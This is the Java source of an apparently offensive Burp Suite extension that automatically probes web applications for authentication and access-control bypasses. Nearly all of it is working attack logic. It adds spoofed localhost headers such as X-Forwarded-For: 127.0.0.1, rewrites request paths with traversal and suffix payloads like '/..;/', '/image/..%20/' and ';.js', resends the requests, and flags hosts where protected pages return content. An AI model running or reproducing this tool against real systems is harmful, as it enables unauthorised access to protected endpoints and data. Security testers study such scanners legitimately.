package burp.ScanFun;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BypassScan {
    private static final String[] Suffix= new String[]{".json",".css",".js",";.js",";.css",";.png",";.jpg",";.gif",";.jsp",";login",";image",";css",";public",";.html",";html","%20","%09","/#/","/?error","/%26",";static",";swagger"};
    private static final String[] Prefix= new String[]{"/","/../","/..;/","/;/","/image/..;/","/image/../","/public/..;/","/login/..;/","/static/..;/","/js/..;/","/image/..%20/","/image/..%09/","/swagger/..;/"};
//    static PrintWriter stdout;

    private static final String[] black_list = new String[] {
            "/login", "/logout", "/register", "/signup", "/captcha", "/favicon.ico",
            "reg/","signup/", "static/", "swagger/", "assets/","static/", "static/js", "static/css", "static/images", "static/fonts", "static/font", "static/font-awesome", "static/font-awesome/css", "static/font-awesome/fonts", "static/font-awesome/less", "static/font-awesome/scss", "static/font-awesome/webfonts", "static/font-awesome/css/font-awesome.css", "static/font-awesome/css/font-awesome.min.css", "static/font-awesome/fonts/fontawesome-webfont.eot",
            ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg",
            ".woff", ".woff2", ".ttf", ".otf", ".ico",
            ".mp3", ".mp4", ".avi", ".mov", ".swf",
            ".apk", ".exe", ".iso", ".dmg",
            ".xls", ".xlsx", ".doc", ".docs", ".pdf",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            "error",  "robots.txt",".json",".xml"
    };


    private static Set<String> bypassedHosts = new HashSet<>();


public static IHttpRequestResponse ScanBypass(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
    URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
    String host = url.getHost();

    if (bypassedHosts.contains(host)) {
        BurpExtender.stdout.println("[*] Host " + host + " 已检测绕过，跳过扫描");
        return null;
    }
    BurpExtender.stdout.println("开始Bypass扫描");

    List<String> headers = new ArrayList<>(helpers.analyzeRequest(baseRequestResponse).getHeaders());
    int origStatusCode = helpers.analyzeResponse(baseRequestResponse.getResponse()).getStatusCode();
    String originBody =new String(baseRequestResponse.getResponse());

    List<String> queue = BurpExtender.MakeQueue_v2(url.getHost(), headers.get(0), BurpExtender.scannedDomainURL_Bypass);

    ArrayList<String> scannedPath = new ArrayList<>();

    for (String path : queue) {
        if (shouldSkip(path)){
            System.out.println("黑名单跳过" + path);
            continue;
        }
//        Matcher matcher = Pattern.compile("GET (.*) HTTP/1.1").matcher(path);
        Matcher matcher = Pattern.compile("^(GET|POST)\\s+(\\S+)\\s+HTTP/1\\.[01]$").matcher(path);
        if (!matcher.find()) {
            continue;
        }
        String originalPath = matcher.group(1);
        scannedPath.add(path);

        if (origStatusCode == 401 || origStatusCode == 403 || origStatusCode == 302 || originBody.contains("认证失败") || originBody.contains("认证失败") || originBody.contains("未登录") || originBody.contains("请登录") || originBody.contains("token失效") || originBody.contains("失效") || originBody.contains("未授权") || originBody.contains("认证失败") ||originBody.contains("unauthorized")||originBody.contains("unauthenticated")||originBody.contains("errors.aliyun.com")) {
            try {
                headers.add("X-Custom-IP-Authorization: 127.0.0.1");
                headers.add("X-Forwarded-For: 127.0.0.1");
                headers.add("X-Client-IP: 127.0.0.1");
                headers.add("X-Remote-Addr: 127.0.0.1");
                headers.add("X-Originating-IP: 127.0.0.1");
                headers.add("Referer: http://127.0.0.1");
                // 先尝试所有后缀
                for (String pocSuffix : Suffix) {
                    String newPath = BypassScan.AddPoc_fix(path, pocSuffix);
                    headers.set(0, newPath);
                    byte[] request = helpers.buildHttpMessage(headers, null);

                    // 睡眠控制频率
                    Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));

                    IHttpRequestResponse response = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request);


                    if (response == null || response.getResponse() == null) {
                        continue; // 无响应，尝试下一个poc
                    }

                    int statusCode = helpers.analyzeResponse(response.getResponse()).getStatusCode();
                    String responseBody = helpers.bytesToString(response.getResponse());

                    if (statusCode != 302 && statusCode != 401 && statusCode != 403 && statusCode != 404) {
                        if ((statusCode == 200 || statusCode == 405 || statusCode == 415) && !(responseBody.contains("认证失败") || responseBody.contains("未登录") || responseBody.contains("请登录") || responseBody.contains("token失效") || responseBody.contains("失效") || responseBody.contains("未授权") || responseBody.contains("认证失败") ||responseBody.contains("unauthorized")||responseBody.contains("unauthenticated")||responseBody.contains("errors.aliyun.com"))) {
                            bypassedHosts.add(host);
                            BurpExtender.addScannedURL(url.getHost() + ":" + url.getPort(), scannedPath, BurpExtender.scannedDomainURL_Bypass);
                            return response; // 发现绕过点，直接返回
                        }
                    }

                }

                // 如果后缀都没成功，尝试前缀
                for (String pocPrefix : Prefix) {
                    String newPath = BypassScan.AddPoc_v2(path, pocPrefix);
                    headers.set(0, newPath);
                    byte[] request = helpers.buildHttpMessage(headers, null);

                    Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));

                    IHttpRequestResponse response = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request);

                    if (response == null || response.getResponse() == null) {
                        continue;
                    }

                    int statusCode = helpers.analyzeResponse(response.getResponse()).getStatusCode();
                    String responseBody = helpers.bytesToString(response.getResponse());

                    if (statusCode != 302 && statusCode != 401 && statusCode != 403 && statusCode != 404) {
                        if ((statusCode == 200 || statusCode == 405 || statusCode == 415) && !(responseBody.contains("认证失败") || responseBody.contains("未登录") || responseBody.contains("请登录") || responseBody.contains("token失效") || responseBody.contains("失效") || responseBody.contains("未授权") || responseBody.contains("认证失败") ||responseBody.contains("unauthorized")||responseBody.contains("unauthenticated")||responseBody.contains("errors.aliyun.com"))) {
                            bypassedHosts.add(host);
                            BurpExtender.addScannedURL(url.getHost() + ":" + url.getPort(), scannedPath, BurpExtender.scannedDomainURL_Bypass);
                            return response; // 发现绕过点，直接返回
                        }
                    }
                }

            } catch (Exception e) {
            }
        }
    }
    BurpExtender.stdout.println("开始Bypass扫描");

    return null;
}



    public static String AddPoc(String path, String poc) {
        // 先拆分请求方法、URL和版本号
        int firstSpace = path.indexOf(' ');
        if (firstSpace < 0) {
            return path; // 格式不对，直接返回
        }

        String method = path.substring(0, firstSpace + 1); // 包含空格
        int secondSpace = path.indexOf(' ', firstSpace + 1);
        if (secondSpace < 0) {
            return path; // 格式不对，直接返回
        }

        String url = path.substring(firstSpace + 1, secondSpace);
        String version = path.substring(secondSpace);

        // 把 URL 按最后一个 '/' 拆分成两部分
        int lastSlash = url.lastIndexOf('/');
        if (lastSlash < 0) {
            // 没有 '/'，直接拼接 poc
            url = url + poc;
        } else {
            String prefix = url.substring(0, lastSlash + 1); // 包含最后的 '/'
            String lastPart = url.substring(lastSlash + 1);
            // 在最后部分后面加上 poc
            url = prefix + lastPart + poc;
        }

        return method + url + version;
    }

    public static String AddPoc_fix(String path, String poc) {
        int firstSpace = path.indexOf(' ');
        if (firstSpace < 0) {
            return path;
        }

        String method = path.substring(0, firstSpace + 1);
        int secondSpace = path.indexOf(' ', firstSpace + 1);
        if (secondSpace < 0) {
            return path;
        }

        String url = path.substring(firstSpace + 1, secondSpace);
        String version = path.substring(secondSpace);

        // 拆分参数
        String urlPath = url;
        String query = "";
        int qIndex = url.indexOf('?');
        if (qIndex != -1) {
            urlPath = url.substring(0, qIndex);
            query = url.substring(qIndex); // 包括 ?
        }

        // 找最后一个 /
        int lastSlash = urlPath.lastIndexOf('/');
        if (lastSlash < 0) {
            urlPath = urlPath + poc; // 没有 /，直接加
        } else {
            String prefix = urlPath.substring(0, lastSlash + 1);
            String lastPart = urlPath.substring(lastSlash + 1);
            urlPath = prefix + lastPart + poc;
        }

        return method + urlPath + query + version;
    }

    public static String AddPoc_v2(String path, String poc) {
        // 先拆分请求方法、URL和版本号
        int firstSpace = path.indexOf(' ');
        if (firstSpace < 0) {
            return path; // 格式不对，直接返回
        }

        String method = path.substring(0, firstSpace + 1); // 包含空格
        int secondSpace = path.indexOf(' ', firstSpace + 1);
        if (secondSpace < 0) {
            return path; // 格式不对，直接返回
        }

        String url = path.substring(firstSpace + 1, secondSpace);
        String version = path.substring(secondSpace);

        int apiIndex = url.indexOf("/api/");
        String newUrl;
        if (apiIndex >= 0) {
            int insertPos = apiIndex + "/api".length();
            String beforeApi = url.substring(0, insertPos);
            String afterApi = url.substring(insertPos);
            newUrl = beforeApi + poc + afterApi;
        } else {
            if (!poc.startsWith("/")) {
                poc = "/" + poc;
            }
            newUrl = poc + url;
        }

        return method + newUrl + version;
    }

    public static boolean shouldSkip(String path) {
        for (String keyword : black_list) {
            if (path.toLowerCase().contains(keyword)) {
                return true;
            }
        }
        return false;
    }
}
